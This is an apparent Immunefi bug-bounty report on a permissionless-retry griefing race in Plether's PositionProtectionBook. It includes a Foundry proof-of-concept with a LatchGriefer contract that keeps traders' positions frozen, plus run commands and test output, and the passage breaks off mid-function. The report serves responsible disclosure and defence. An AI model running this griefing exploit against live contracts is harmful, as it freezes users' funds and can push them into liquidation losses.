# \#99217 [SC-High] Permissionless protection retry blocks the owner's only Latched remedy (incomplete MED-9 fix), freezing the position until liquidation

**Submitted on Nov 12th 2026 at 12:51:15 UTC by @thejoker0911 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99217
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief / Introduction

Cecuro MED-9 was fixed in #124 by storing the close limits set by the trader and adding `amendLatchedPositionProtectionCloseLimits`, which allows the owner to change those limits when a protection close fails.

There is still a problem with `retryPositionProtectionClose`: anyone can call it, and it immediately moves the protection from `Latched` to `Triggered`, creating another close attempt with the same limits. A third party can exploit this by executing each failed attempt and calling `retryPositionProtectionClose` in the same transaction, before the owner has a chance to amend the limits.

This leaves the owner unable to use any of the available exit functions. Amendments, cancellations, cancel-and-close operations and ordinary position closes all revert. The position and its margin remain locked for as long as the attacker keeps winning this race. I reproduced this behaviour continuously for one hour under a realistic execution cadence. The only ways out are for the market price to return within the original limits or for the account to be liquidated.

## Vulnerability Details

**Target:** `packages/perps/src/PositionProtectionBook.sol` at commit `a82d4fe`
**Functions:** `retryPositionProtectionClose`, `amendLatchedPositionProtectionCloseLimits`, `_cancel`, `cancelPositionProtectionAndCommitClose`; also `OrderLiquidationBatchLogic._validateFreshRequest` and the `ProtectionActive` lock.

### Summary

Cecuro MED-9 ("Keepers can retry protection closes without the trader's financial limits") was addressed in PR #124 (`eadc5c58`), after the audited commit `6d6622f2`.

The fix introduced trader-defined close ceilings, which are now stored and copied into every generated close attempt. It also added `amendLatchedPositionProtectionCloseLimits`, giving the owner a way to relax those limits when a protection close fails.

The MED-9 acknowledgement is explicit: "Tight limits may prevent execution until conditions improve or the owner amends them."

That second option is not reliably available. Since `retryPositionProtectionClose` is permissionless, a third party can keep the protection from remaining in the state required for an amendment.

The function `amendLatchedPositionProtectionCloseLimits` checks two conditions:

- The protection status must be `Latched`.
- `pendingOrderCounts(owner)` must be 0.

`retryPositionProtectionClose` has no access restriction. It moves the protection from `Latched` to `Triggered` and queues another close attempt using the original limits.

This makes the following sequence possible:

1. The third party executes the pending close attempt, which fails.
2. The protection returns to `Latched`.
3. The third party immediately calls `retryPositionProtectionClose`.
4. The protection moves back to `Triggered`, with a new attempt using the same limits.

Steps 1–4 can be repeated in a single transaction for each attempt. If the third party executes every new attempt first, the owner never gets the opportunity to amend the limits.

All direct exit options are affected:

- `cancelPositionProtection` reverts with `OrderRouter__ProtectionNotArmed`, because `_cancel` only accepts `PendingOpen` or `Armed`.
- `cancelPositionProtectionAndCommitClose` reverts with `ProtectionNotArmed`.
- Any ordinary `commitOrder`, including a position close, reverts with `OrderRouter__ProtectionActive`. The lock is in `OrderLiquidationBatchLogic.sol:313`.
- `amendLatchedPositionProtectionCloseLimits` reverts with `ProtectionNotLatched`.

The owner is therefore left with an open position that cannot be closed or cancelled, and the margin remains tied to it. This continues until the price returns within the stored limits or the account is liquidated.

The same problem can arise, on a much shorter timescale, with the normal keeper workflow. CANONICAL_ENTRYPOINTS tells keepers to "observe `Latched` … and submit the separate retry transaction". This leaves a window between the failed execution and the retry, but there is no guarantee that the owner will get to use it first.

### Root Cause

The amendment mechanism depends on two conditions being true at the same time: the protection must be `Latched` and there must be no pending orders.

Neither condition is protected from third-party interference. Anyone can call `retryPositionProtectionClose` and move the protection back to `Triggered` before the owner can submit an amendment.

There is no owner-priority mechanism. The owner cannot:

- Amend the limits while the protection is `Triggered`, applying the changes to the next attempt.
- Amend the limits and retry in a single operation.
- Get an owner-only retry window after the protection returns to `Latched`.
- Cancel a `Latched` protection or close the underlying position.

As a result, the recovery mechanism introduced by #124 can be blocked by any permissionless caller.

### Recommended Fix (any one)

- Allow the owner to amend the close limits while the protection is `Triggered`, with the new limits taking effect on the next attempt. An alternative would be an owner-accessible `amendAndRetry` function.
- Give the owner exclusive access to `retryPositionProtectionClose` for a short period after the protection returns to `Latched`, for example N seconds or until the next block plus one.
- Allow the owner to cancel a `Latched` protection through `cancelPositionProtectionAndCommitClose`, or to submit an ordinary position close.

## Impact Details

Impacts: "Temporary freezing of funds for at least 1 hour" (Medium) and "Griefing".

### Attack Scenario (PoC Numbers)

1. Alice opens a LONG position with a size of 10,000e18 (100 lots), 2,000 USDG in margin and an entry price of 1.00. In Plether, a LONG position loses value when the price rises.
2. She sets SL = 1.10 and a slippage-style ceiling of `maxExecutionNotionalAssets = 11,050 USDG`. This is the notional value at the SL price plus approximately 0.45%.
3. The price moves to 1.15. A keeper triggers the protection, but the close attempt fails with `ConstraintViolation` (ExecutionNotional). The protection enters the `Latched` state.
   - **Control:** Alice amends the limits to unlimited and closes the position at 1.15. Her final wealth is **18,491.2 USDG**.
4. **Attack:** A griefer contract executes `executeOrder(attempt) + retryPositionProtectionClose(pid)` atomically, repeating the same sequence as soon as each new attempt becomes executable.
   - **Fast cadence** (`test_Attack_FastCadence_AlwaysConstraintViolation`): The griefer executes each new attempt at the first available opportunity (the next L2 block, at the first post-commit Pyth tick). All 60 consecutive attempts fail with `ConstraintViolation`, and every amendment Alice tries reverts.
   - **Realistic one-hour scenario** (`test_Attack_RealisticCadence_OneHourFreeze`): The griefer follows the same first-executable-moment strategy continuously, while the price remains at 1.15, outside the stored ceiling. The test runs **3,600 cycles over 3,600 seconds and 3,600 blocks**. Every attempt ends with `ConstraintViolation`, not `Expired`, and the position remains open for the entire hour. Alice's exit attempts (`amend`, `cancel`, `cancelPositionProtectionAndCommitClose`, `commitOrder`) are checked at the first and last cycle, every 60 cycles, and at additional deterministic random points. All of them revert. Once the hour is over, the test also runs an honest control: the failing attempt is executed without a retry. Alice can then amend the limits and close the position successfully. This confirms that the problem is the repeated retry, not an inability to recover after a failed attempt on its own.
   - **Sparse long-run scenario** (`test_Attack_PermissionlessRetryBlocksAmendAndFreezesPosition`): This test runs 13 cycles over 2h10m, with a 10-minute interval between attempts. It was kept for the liquidation comparison. With this cadence, the attempts expire (`Expired`) after their 60-second window. This test does not demonstrate a freeze lasting at least one hour under realistic execution conditions. During this run, the price gradually moves to 1.21 and Alice is liquidated. Her final wealth is **17,999.8 USDG**, which is **491.4 USDG** less than in the control. The difference comes from the market moving against Alice while she cannot close the position. The griefer does not extract any value from the attack.

### Cost

In `test_Attack_RealisticCadence_OneHourFreeze`, the local test recorded **5,713,917,286** total gas across 3,600 calls to `cycle()`, averaging **1,587,199** gas per cycle. These figures come from `gasleft` deltas around `executeOrder` and `retryPositionProtectionClose`.

The measurement covers L2 execution gas in the local test suite using MockPyth. Pyth update fees and the L1 data component are not included.

Using the market values observed on 12 Nov 2026, the calculation is as follows:

- Arbitrum One gas price: **0.02 gwei**, according to the Arbiscan gas tracker (https://arbiscan.io/gasTracker).
- ETH price: approximately **$2,044**.
- Estimated cost for one hour of continuous griefing: **0.114 ETH, approximately $234**, in L2 execution gas.

Pyth update fees and L1 data costs would be added to this amount.

The attacker makes no money from the operation. The cost is nevertheless relatively low compared with the exposure of a leveraged position that cannot be closed or de-risked for an entire hour.

### Limitations (Stated Up Front)

- **This is a race condition, not a permanent lock.** `executeOrder` is permissionless, so an owner using a smart account or an EIP-7702 batch can execute the failing attempt, amend the limits and retry atomically. If that batch is included before the griefer's next cycle, the owner can exit. I verified this locally in a separate test, available on request. The owner also gets the opportunity to recover if the griefer does not retry after a failed execution. The honest control at the end of `test_Attack_RealisticCadence_OneHourFreeze` demonstrates this. The attack therefore requires the griefer to win transaction ordering at the first executable moment of every attempt. Arbitrum Timeboost express lane access or lower latency are possible ways to achieve this. A standard EOA owner cannot batch these operations and has no way to consistently beat a griefer that executes first.
- **The owner can prevent liquidation by adding margin.** `CfdEngine.addMargin` is not blocked by the protection lock, so additional margin can be added while the position is frozen. I verified this in a separate local test, available on request. This prevents liquidation but does not restore control over the position. The owner still cannot close it or withdraw the margin, and the market exposure remains open.
- **The freeze ends** if the price moves back within the stored ceilings and the close attempt can execute, or if the griefer stops retrying.
- **The limits are chosen by the trader.** There is no issue with traders setting tight limits. The problem is that the recovery mechanism provided for precisely this situation, allowing the owner to amend the limits after a failed attempt, can be blocked by any third party.

### Why This Is Not an Excluded Known Issue

- MED-9 is marked as "Acknowledged/Addressed". Its fix in #124 was introduced after the audit, but the amendment mechanism it added can still be made inaccessible. The issue described here was not resolved by that change.
- The AI scan finding about a permissionless caller collecting the trigger bounty and "can abandon the flow after receiving payment" concerns an attempt that has not been executed, and the incentive to abandon the process after collecting the bounty. My finding concerns a different sequence: the attempt is executed, fails, and is immediately queued again by a third party. This prevents the owner from amending the limits.
- SECURITY.md already lists the following known limitation: "failed protection-attempt cleanup is deliberately unpaid; each retry creates a fresh zero-bounty close record". It does not mention that repeated retries can prevent the owner from using the amendment function.
- The irreversible nature of triggering is also documented. SECURITY.md states that "Triggering is irreversible", and the MED-30 response says that "Pending-open, Triggered and Latched records cannot use this action". The AI scan evidence also notes that "a Triggered or Latched protection cannot be cancelled to regain ordinary close control". I am not reporting the inability to cancel or close a triggered or latched protection as a vulnerability. That restriction is already known. It matters here because the owner has no alternative exit once the protection is in that state. The MED-9 response explicitly relies on the owner's ability to amend the limits: "Tight limits may prevent execution until conditions improve or the owner amends them". PR #124 makes the same point: "Explicit limits survive retries, with owner amendment available after relatch". The problem is that a third party can prevent the owner from reaching the state in which that amendment is possible.
- I found no public issue, PR or commit discussing this particular retry/amendment race in `Plether-Fi/plether-core` or `immunefi-team/audit-comp-plether`. Upstream master (latest commit `6909f26`, a test-only change) has not modified `PositionProtectionBook.sol` since `a82d4fe`.

## References

- Vulnerable code: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PositionProtectionBook.sol (`retryPositionProtectionClose`, `amendLatchedPositionProtectionCloseLimits`, `_cancel`, `cancelPositionProtectionAndCommitClose`)
- `ProtectionActive` lock: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/router/OrderLiquidationBatchLogic.sol#L313
- Cecuro audit (MED-9 and its response): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf
- SECURITY.md: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md
- MED-9 fix: PR #124 (commit `eadc5c58`): https://github.com/Plether-Fi/plether-core/pull/124
- Arbitrum gas price used for the cost estimate: https://arbiscan.io/gasTracker

## Proof of Concept

## Proof of Concept

### Attack steps (what the PoC shows)

1. Alice opens a LONG (10,000e18 size / 100 lots, 2,000 USDG margin) at mark 1.00 and creates a stop-loss protection at 1.10 with a tight `maxExecutionNotionalAssets = 11,050 USDG` ceiling (notional at the SL plus ~0.45% slippage).
2. Price gaps to 1.15. A keeper triggers the protection. The generated close attempt fails with `TerminalReason.ConstraintViolation` (execution notional above the ceiling) and the protection becomes `Latched`.
3. **Control path** (`test_Control_TraderAmendsLatchedLimitsAndExits`): Alice calls `amendLatchedPositionProtectionCloseLimits` to unlimited, then `retryPositionProtectionClose`, and the retry executes. She exits with wealth 18,491.2 USDG.
4. **Attack path:** an unprivileged `LatchGriefer` contract, in one transaction per attempt, calls `executeOrder(attempt)` (fails → Book relatches) then the permissionless `retryPositionProtectionClose(pid)` (status back to `Triggered`, new attempt carries the **old** ceilings).
5. Fast cadence (`test_Attack_FastCadence_AlwaysConstraintViolation`): 60 consecutive first-executable-moment cycles (next block + first post-commit Pyth tick via the repo's `_mockPythUpdateData`). Every failure is `ConstraintViolation`; every owner `amend` reverts `ProtectionNotLatched`.
6. Realistic ≥1 hour freeze (`test_Attack_RealisticCadence_OneHourFreeze`): the same first-executable-moment cadence for **3600 cycles / 3600 seconds / 3600 blocks**, price held at 1.15. Every attempt terminates as `ConstraintViolation` (not `Expired`). Owner exits (`amend`, `cancel`, `cancelPositionProtectionAndCommitClose`, `commitOrder`) are asserted at cycle 1, every 60 cycles, at additional deterministic samples, and at the end; all revert. Position size stays open the whole hour. After the hour, an honest control executes the failing attempt **without** retry: Alice's amend then succeeds and she exits (race caveat).
7. Sparse comparison (`test_Attack_PermissionlessRetryBlocksAmendAndFreezesPosition`): 13 cycles over ~2h10m at a 10-minute cadence (attempts expire; not the ≥1h evidence). Price drifts to 1.21 and Alice is liquidated at wealth 17,999.8 USDG (491.4 USDG below the control). The griefer gains nothing.

### How to run (clean checkout of `immunefi-team/audit-comp-plether` at `a82d4fe`)

Place the file at:

`packages/perps/test/perps/poc/PoC_RetryBlocksAmend.t.sol`

(import already points at `../BasePerpTest.sol`). No in-scope contract is modified. Only the repo's `MockPyth` is used.

```bash
cd packages/perps
FOUNDRY_TEST=test/perps/poc forge test --gas-limit 30000000000 --match-contract PoC_ProtectionRetryBlocksAmend -vv
```

**Foundry gas_limit note:** Foundry's default `gas_limit` is `2^30` (~1.07e9). About 600 grief cycles in one test transaction exhaust it; `executeOrder` then returns `Pending(InsufficientGas)` and the following `retry` reverts `ProtectionNotLatched`. That is a harness artifact — on a live chain each cycle is its own transaction. `--gas-limit 30000000000` is required so all 3600 cycles fit one Foundry test transaction.

### Expected output (this environment, real run)

```
[PASS] test_Attack_FastCadence_AlwaysConstraintViolation() (gas: 101522459)
[PASS] test_Attack_PermissionlessRetryBlocksAmendAndFreezesPosition() (gas: 21810151)
Logs:
  first cycle terminal reason (8=ConstraintViolation,2=Expired): 2
  maxExecutionWindowSeconds: 60
  seconds ALICE was locked out: 7813
  attack: ALICE wealth before liquidation: 19995800000
  attack: ALICE wealth after liquidation: 17999800000

[PASS] test_Attack_RealisticCadence_OneHourFreeze() (gas: 6224292333)
Logs:
  realistic cadence: cycles: 3600
  realistic cadence: frozen seconds: 3600
  realistic cadence: blocks elapsed: 3600
  realistic cadence: total griefer gas (gasleft over cycle()): 5713917286
  realistic cadence: avg gas per cycle: 1587199
  estimate: griefer cost in wei at 0.02 gwei: 114278345720000000
  estimate: USD cents at 0.02 gwei and $2044/ETH: 23358

[PASS] test_Control_TraderAmendsLatchedLimitsAndExits() (gas: 6276775)
Logs:
  control: ALICE wealth after exit (USDG atoms): 18491200000

Suite result: ok. 4 passed; 0 failed; 0 skipped
```

Cost (local L2 gas with MockPyth; no real Pyth fee / L1 data): total griefer gas **5,713,917,286**, avg **1,587,199**/cycle. At Arbitrum One **0.02 gwei** (Arbiscan gasTracker, 12 Nov 2026) and ETH ≈ **$2,044**, ≈ **0.114 ETH ≈ $234** for one hour of continuous griefing, plus Pyth/L1 costs not measured here.

### PoC source

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionBook} from "@plether/perps/interfaces/IPositionProtectionBook.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {IMarginClearinghouse} from "@plether/perps/interfaces/IMarginClearinghouse.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";


/// Shared fixture copied from test/perps/spec/trader/PositionProtection.t.sol helpers (unchanged semantics).
abstract contract ProtectionDeepBase is BasePerpTest {
    IPositionProtectionBook internal protectionBook;
    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;

    address internal constant ALICE = address(0xA11CE);
    address internal constant TRIGGER_KEEPER = address(0x7106);
    address internal constant EXECUTION_KEEPER = address(0xE0EC);

    uint256 internal constant MARK_PRICE = 1e8;
    uint256 internal constant POSITION_SIZE = 10_000e18; // 100 lots -> 10,000 USDG notional at 1.00
    uint256 internal constant POSITION_MARGIN_ASSETS = 2000e6;

    function setUp() public virtual override {
        super.setUp();
        protectionBook = router.positionProtectionBook();
        protectionActions = IPositionProtectionActions(address(protectionBook));
        protectionViews = IPositionProtectionViews(address(protectionBook));
        _fundTrader(ALICE, 20_000e6);
        _refreshMark(MARK_PRICE);
    }

    function _refreshMark(uint256 price) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(uint256 price) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _explicitUnique(uint256 price, uint256 publishTime, uint256 prevPublishTime)
        internal
        pure
        returns (bytes[] memory updateData)
    {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(
                ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, publishTime, prevPublishTime)
            );
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

    function _unlimited() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory l) {
        l = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _params(uint256 takeProfit, uint256 stopLoss)
        internal
        pure
        returns (PositionProtectionTypes.PositionProtectionParams memory params)
    {
        params.takeProfitTriggerPrice = takeProfit;
        params.stopLossTriggerPrice = stopLoss;
        params.closeLimits = _unlimited();
    }

    function _triggerAt(uint64 protectionId, uint256 price) internal returns (uint64 linkedOrderId) {
        _mockPythUpdateData(price);
        bytes[] memory updateData = _livePriceData(price);
        vm.prank(TRIGGER_KEEPER);
        linkedOrderId = protectionActions.triggerPositionProtection(protectionId, updateData);
    }

    function _status(uint64 protectionId) internal view returns (PositionProtectionTypes.PositionProtectionStatus) {
        return protectionViews.getPositionProtection(protectionId).status;
    }

    function _size(address a) internal view returns (uint256 s) {
        (s,,,,,,) = engine.positions(a);
    }

    function _liquidate(address account, uint256 price) internal {
        _mockPythUpdateData(price);
        bytes[] memory updateData = _livePriceData(price);
        vm.prank(EXECUTION_KEEPER);
        router.executeLiquidation(account, updateData);
    }
}

/// Unprivileged third party: executes the doomed protection attempt and immediately re-queues a retry, atomically.
/// If `executeOrder` returns Pending (e.g. InsufficientGas) instead of Failed, retry reverts with
/// ProtectionNotLatched — that is a Foundry tx gas_limit artifact when too many cycles share one test
/// transaction, not a protocol escape. Raise `--gas-limit` (default is 2^30) so every cycle can Failed.
contract LatchGriefer {
    function cycle(OrderRouter router, IPositionProtectionActions book, uint64 attemptId, bytes[] calldata data, uint64 pid)
        external
        returns (uint64 nextAttempt, uint8 reason)
    {
        OrderV3Types.ExecutionResult memory r = router.executeOrder(attemptId, data);
        // Failed → Book relatches. Pending(InsufficientGas) means the test tx ran out of gas mid-loop.
        require(
            r.status == OrderV3Types.LifecycleStatus.Failed,
            "cycle: execute did not Fail (raise forge --gas-limit if Pending/InsufficientGas)"
        );
        reason = uint8(r.terminalReason);
        nextAttempt = book.retryPositionProtectionClose(pid); // permissionless; status back to Triggered
    }
}

contract PoC_ProtectionRetryBlocksAmend is ProtectionDeepBase {
    uint256 internal constant SL = 110_000_000; // LONG loses when price rises
    uint256 internal constant GAP = 115_000_000;
    // Trader's close ceiling: notional at the SL + ~0.45% slippage allowance.
    uint256 internal constant NOTIONAL_CAP = 11_050e6;

    function _armWithCap() internal returns (uint64 pid) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory p = _params(0, SL);
        p.closeLimits.maxExecutionNotionalAssets = NOTIONAL_CAP;
        vm.prank(ALICE);
        pid = protectionActions.createPositionProtection(p);
    }

    function _wealth(address a) internal view returns (uint256) {
        return clearinghouse.balanceAssets(a) + engine.traderClaimBalanceAssets(a);
    }

    // ---------------------------------------------------------------------------------------------
    // CONTROL: price gaps through SL, capped close fails, trader amends in the gap and exits.
    // ---------------------------------------------------------------------------------------------
    function test_Control_TraderAmendsLatchedLimitsAndExits() public {
        uint64 pid = _armWithCap();
        uint64 attempt = _triggerAt(pid, GAP);
        bytes[] memory data = _mockPythUpdateData(GAP);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(attempt, data);
        assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation), "cap violated");
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _unlimited());
        uint64 retry = protectionActions.retryPositionProtectionClose(pid);
        data = _mockPythUpdateData(GAP);
        vm.prank(EXECUTION_KEEPER);
        r = router.executeOrder(retry, data);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended retry executes");
        assertEq(_size(ALICE), 0, "closed");
        emit log_named_uint("control: ALICE wealth after exit (USDG atoms)", _wealth(ALICE));
    }

    // ---------------------------------------------------------------------------------------------
    // ATTACK: any third party keeps the protection permanently in Triggered by atomically
    // execute(fail)+retry. The owner can never amend (requires Latched + empty queue), cannot cancel
    // (Triggered/Latched not cancellable), cannot cancel-and-close (requires Armed) and cannot commit any
    // ordinary order (ProtectionActive lock). Position is frozen until liquidation.
    // ---------------------------------------------------------------------------------------------
    function test_Attack_PermissionlessRetryBlocksAmendAndFreezesPosition() public {
        uint64 pid = _armWithCap();
        uint64 attempt = _triggerAt(pid, GAP);
        LatchGriefer g = new LatchGriefer();
        uint256 startTs = vm.getBlockTimestamp();

        uint256 px = GAP;
        for (uint256 i; i < 13; ++i) {
            // 10 minutes per cycle, price keeps drifting against the trader
            vm.warp(vm.getBlockTimestamp() + 600);
            if (px < 119_000_000) px += 300_000;
            bytes[] memory data = _mockPythUpdateData(px);
            uint8 reason;
            (attempt, reason) = g.cycle(router, protectionActions, attempt, data, pid);
            if (i == 0) emit log_named_uint("first cycle terminal reason (8=ConstraintViolation,2=Expired)", reason);
            assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));

            // Trader tries every exit available to them; all revert.
            vm.startPrank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _unlimited());
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            protectionActions.cancelPositionProtection(pid);
            OrderV3Types.OrderRequest memory req;
            req.isClose = true;
            req.side = CfdTypes.Side.LONG;
            req.sizeDelta = POSITION_SIZE;
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
            protectionActions.cancelPositionProtectionAndCommitClose(pid, req);
            vm.stopPrank();
            assertEq(_size(ALICE), POSITION_SIZE, "position still open");
        }
        emit log_named_uint("maxExecutionWindowSeconds", router.maxExecutionWindowSeconds());
        emit log_named_uint("seconds ALICE was locked out", vm.getBlockTimestamp() - startTs);
        assertGt(vm.getBlockTimestamp() - startTs, 2 hours);

        // Price keeps moving; account ends up liquidated instead of closed near the trader's intent.
        uint256 before = _wealth(ALICE);
        _liquidate(ALICE, 121_000_000);
        assertEq(_size(ALICE), 0, "liquidated");
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Liquidated));
        emit log_named_uint("attack: ALICE wealth before liquidation", before);
        emit log_named_uint("attack: ALICE wealth after liquidation", _wealth(ALICE));
    }

    /// Realistic cadence: griefer executes each fresh attempt at the earliest possible moment (next block,
    /// first post-commit Pyth tick), so honest keepers never get to it first; every failure is a typed
    /// ConstraintViolation and the owner never observes a Latched state with an empty queue.
    function test_Attack_FastCadence_AlwaysConstraintViolation() public {
        uint64 pid = _armWithCap();
        uint64 attempt = _triggerAt(pid, GAP);
        LatchGriefer g = new LatchGriefer();
        for (uint256 i; i < 60; ++i) {
            bytes[] memory data = _mockPythUpdateData(GAP); // +1 block, +1 s, tick = commitTime + 1
            uint8 reason;
            (attempt, reason) = g.cycle(router, protectionActions, attempt, data, pid);
            assertEq(reason, uint8(OrderV3Types.TerminalReason.ConstraintViolation));
            vm.prank(ALICE);
            vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
            protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _unlimited());
        }
        assertEq(_size(ALICE), POSITION_SIZE);
    }

    /// Realistic cadence for >= 1 hour: the griefer executes each fresh attempt at its first executable
    /// moment (next block and first post-commit Pyth tick, via `_mockPythUpdateData`: +1 block, +1 s).
    /// Price stays at GAP, outside the stale notional cap, so every attempt must fail ConstraintViolation
    /// (not Expired). Owner exits are asserted every 60 cycles, at deterministic "random" points, and at
    /// the first and last cycle. After the hour, an honest control shows that if the griefer does not act
    /// after a failed execute, the owner's amend succeeds.
    ///
    /// Foundry note: default `gas_limit` is 2^30. ~600 cycles exhaust it and `executeOrder` returns
    /// Pending(InsufficientGas), after which retry reverts ProtectionNotLatched. That is a harness
    /// artifact, not a protocol escape — each real-chain cycle is its own transaction. Run with
    /// `forge test --gas-limit 30000000000` (or higher) so all 3600 cycles fit one test transaction.
    function test_Attack_RealisticCadence_OneHourFreeze() public {
        uint64 pid = _armWithCap();
        uint64 attempt = _triggerAt(pid, GAP);
        LatchGriefer g = new LatchGriefer();

        uint256 startTs = vm.getBlockTimestamp();
        uint256 startBlock = vm.getBlockNumber();
        uint256 totalGas;
        uint256 cycles;

        while (vm.getBlockTimestamp() - startTs < 3600) {
            bytes[] memory data = _mockPythUpdateData(GAP);
            uint8 reason;
            uint256 g0 = gasleft();
            (attempt, reason) = g.cycle(router, protectionActions, attempt, data, pid);
            totalGas += g0 - gasleft();
            cycles += 1;

            assertEq(reason, uint8(OrderV3Types.TerminalReason.ConstraintViolation), "ConstraintViolation, not Expired");
            assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));
            assertEq(_size(ALICE), POSITION_SIZE, "position still open");

            if (_shouldSampleExits(cycles)) {
                _assertOwnerExitsBlocked(pid);
            }
        }

        uint256 duration = vm.getBlockTimestamp() - startTs;
        uint256 blocksElapsed = vm.getBlockNumber() - startBlock;
        assertGe(duration, 3600, "frozen for at least 1 hour");
        assertEq(cycles, duration, "one cycle per second");
        _assertOwnerExitsBlocked(pid);
        assertEq(_size(ALICE), POSITION_SIZE, "still frozen at T+1h");
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered));

        emit log_named_uint("realistic cadence: cycles", cycles);
        emit log_named_uint("realistic cadence: frozen seconds", duration);
        emit log_named_uint("realistic cadence: blocks elapsed", blocksElapsed);
        emit log_named_uint("realistic cadence: total griefer gas (gasleft over cycle())", totalGas);
        emit log_named_uint("realistic cadence: avg gas per cycle", totalGas / cycles);
        // Cost estimate only (not a live quote). Assumptions match the written report:
        // Arbitrum One gas 0.02 gwei (Arbiscan gasTracker, 12 Nov 2026); ETH ≈ $2,044.
        // 0.02 gwei = 2e7 wei. wei_cost = totalGas * 2e7. usd_cents = wei * 2044 * 100 / 1e18.
        uint256 ethWeiAt002Gwei = totalGas * 2e7;
        emit log_named_uint("estimate: griefer cost in wei at 0.02 gwei", ethWeiAt002Gwei);
        emit log_named_uint("estimate: USD cents at 0.02 gwei and $2044/ETH", (ethWeiAt002Gwei * 2044 * 100) / 1e18);
        emit log_string("estimate notes: local-suite L2 gas with MockPyth (no real Pyth verification, no L1 calldata). Labelled estimate only. Run with forge --gas-limit >= 30000000000 so all 3600 cycles fit one Foundry tx.");

        // Honest control: an execute without retry leaves Latched + empty queue. If the griefer does
        // not act in this window, the owner's amend succeeds (race caveat remains accurate).
        bytes[] memory unlockData = _mockPythUpdateData(GAP);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory r = router.executeOrder(attempt, unlockData);
        assertEq(uint8(r.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));
        assertEq(uint8(_status(pid)), uint8(PositionProtectionTypes.PositionProtectionStatus.Latched));

        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(pid, _unlimited());
        uint64 retry = protectionActions.retryPositionProtectionClose(pid);
        unlockData = _mockPythUpdateData(GAP);
        vm.prank(EXECUTION_KEEPER);
        r = router.executeOrder(retry, unlockData);
        assertEq(uint8(r.status), uint8(OrderV3Types.LifecycleStatus.Executed), "owner exits once griefer skips a beat");
        assertEq(_size(ALICE), 0, "closed after honest-window amend");
    }

    function _shouldSampleExits(uint256 cycle) internal pure returns (bool) {
        if (cycle == 1) return true;
